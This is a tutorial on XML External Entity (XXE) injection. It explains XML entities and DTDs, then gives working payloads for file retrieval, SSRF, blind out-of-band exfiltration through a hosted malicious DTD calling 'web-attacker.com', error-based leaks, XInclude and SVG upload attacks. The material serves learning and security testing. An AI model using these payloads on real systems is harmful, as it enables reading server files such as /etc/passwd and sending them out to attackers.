# XXE

# What is it ?

**XML External Entity Injection** (XXE) is a web security vulnerability that allows an attacker to interfere with the XML parsing of data.

Through XXE, an attacker can read sensitive data in the filesystem of the server. The attacker can also access internal systems of the organization that the server itself can access, by using XXE.

To understand XXE, let us understand what is XML and some terms related to it.

# Some terms related to XML

**XML**: XML stands for eXtensible Markup Language. It is a language used to store and transport data. XML uses tree-like structure with tags and data, similar to HTML. However, tags in XML are not predefined, unlike HTML. So tags can be given any name.

**XML entities**: Entities are a way to represent a data in XML document instead of using the data itself. For e.g. the `&lt;` and `&gt;` are used to represent `<` and `>` characters.

**Document Type Definition**: The XML Document Type Definition (DTD) contains declarations that can define the structure of a XML document, the types of data values it can contain and other values. It is declared with an optional `DOCTYPE` element at the start of the XML document. The DTD can be internal (defined at the top of the document) or external (loaded from some other source).

**Custom entities**: XML allows custom entities to be defined within the DTD. For e.g - 

```jsx
<!DOCTYPE foo [ <!ENTITY pwnersec "An eternal learner"> ] >
```

Whenever `&pwnersec;` entity is used in the XML document, that part will be replaced by `An eternal learner`.

**XML external entities**: External entities are custom entities whose definition is located outside of the DTD. The declaration of the external entity uses the `SYSTEM` keyword and must specify the URL from which the value of the entity should be loaded. For e.g. -

```jsx
<!DOCTYPE foo [ <!ENTITY pwnersec SYSTEM "http://pwnersec.rocks/index.php"> ] >
```

In the URL, the `file://` protocol can also be used to access any file on the server filesystem.

# How do XXE vulnerabilities arise ?

Applications use XML format to store and transmit data between client and server. The server uses some sort of standard library or platform API to parse the XML data. XXE vulnerability arises when the server allows the end user to use certain functionality of these XML parsers which are potentially dangerous.

# Exploiting XXE

**Exploiting XXE to retrieve files**:

- Introduce (edit) a `DOCTYPE` declaration to define an external entity containing the path to the file.
- Modify a data value in XML (that is reflected in response) to make use of the defined external entity.

```jsx
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Exploiting XXE to perform SSRF attack**:

- Declare an external entity containing the URL that you want the server to request, in the `DOCTYPE`.
- Make use of the entity you declared in a data field of XML that is being reflected in response.
- If responses are not seen, you can only perform blind SSRF.

```jsx
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://vulnerable.internal-website.com"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

# Blind XXE

In Blind XXE, the result of the injected external entity is not reflected in the response. Still blind XXE are exploitable using techniques like OAST for data exfiltration.

**Detecting blind XXE using OAST technique**: You can detect blind XXE by defining an external entity with the value of a domain that you control, and then making use of the defined entity in the data fields of the XML. If you get a DNS/HTTP query in your domain, blind XXE is there.

**XML parameter entities**: Sometimes regular entities used for XXE are blocked by the application due to some input validation or XML parser hardening. This can be bypassed using XML parameter entities. These are special type of entities that can only be used within the DTD itself. They are defined with a `%` before the entity name and are used within the DTD through `%ent;`.

```jsx
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

**Exfiltrating data out-of-band from blind XXE**: 

The attacker need to host a malicious DTD.

```jsx
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

The DTD here - 

- Creates a parameter entity called `file` that fetches `/etc/passwd`.
- Next it creates another parameter entity `eval` that defines another dynamic entity `exfiltrate` that requests the attacker control domain with parameter that contains the value of `file` entity.
- Next `eval` entity is called that declares the `exfiltrate` entity.
- At last, `exfiltrate` entity is triggered to exfiltrate the data.

In the application, the attacker needs to request the malicious DTD and trigger the data exfiltration.

```jsx
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

**Exfiltrating data from error messages using Blind XXE**: You can intentionally create a XML parsing error that may leak the sensitive information that you are trying to retrieve using blind XXE.

First, attacker hosts a malicious DTD.

```jsx
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'file:///idontexist/%file;'>">
%eval;
%exfiltrate;
```

Then, he uses the malicious DTD to trigger the error that leaks contents of a file.

**Exploiting blind XXE by repurposing a local DTD**: You can not exfiltrate data using blind XXE if the server blocks out-of-band connections. Blind XXE is still exploitable if you are able to find a local DTD in the server itself, redefine an entity of the local DTD in your XML payload to intentionally trigger an error that may leak the sensitive data that you want to exfiltrate.

```jsx
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

In the payload above, we are including a local DTD `/usr/local/app/schema.dtd` and then we redefine the `custom_entity` which is already defined in `/usr/local/app/schema.dtd`. In this case, the `custom_entity` entity triggers an error that leaks the contents of `/etc/passwd`.

You can find the local DTD easily. As the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.

For example, Linux systems using the GNOME desktop environment often have a DTD file at `/usr/share/yelp/dtd/docbookx.dtd`. You can confirm this by the below payload.

```jsx
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

# Finding attack surface for XXE

Normally, it is pretty obvious to see XXE in any HTTP endpoint that deals with XML data. However, there can also be places where XXE is not obvious.

**XInclude attacks**: `XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an `XInclude` attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include.

```jsx
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**XXE attack via file upload**: Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML sub-components. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

```jsx
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

Reference - [[HERE]](https://gist.github.com/jakekarnes42/b879f913fd3ae071c11199b9bd7ba3a7?short_path=f3432ae)

**XXE attack via modified Content-type**: Most POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.

If a request is something like → 

```jsx
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Change the `Content-Type` header like → 

```jsx
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.

# Testing for XXE

- Testing for file retrieval by defining an external entity based on a well-known operating system
file and using that entity in data that is returned in the application's response.
- Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. Burp Collaborator client is perfect for this purpose.
- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file.